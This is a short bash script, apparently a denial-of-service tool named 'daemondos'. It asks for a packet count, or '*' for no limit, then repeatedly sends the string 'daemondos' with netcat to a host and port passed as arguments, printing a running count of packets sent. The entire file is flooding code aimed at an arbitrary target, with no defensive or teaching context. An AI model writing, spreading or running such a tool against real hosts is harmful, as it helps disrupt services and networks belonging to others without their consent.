#!/bin/bash

echo ''
read -p "Select the limit of packets (write \"*\" to send indefined packets): " marker
echo ''
counter=0
if [ "$marker" != '*' ];then
	while [ $counter -lt "$marker" ];do
		((counter++))
		echo -e "Packet sent. Number of packets sent: $counter"
		echo "daemondos" | nc -w1 -t $1 $2 &>/dev/null
	done
else
	while true;do
		echo -e "Packet sent. Number of packets sent: $counter"
		echo "daemondos" | nc -w1 -t $1 $2 &>/dev/null
		((counter++))
	done
fi
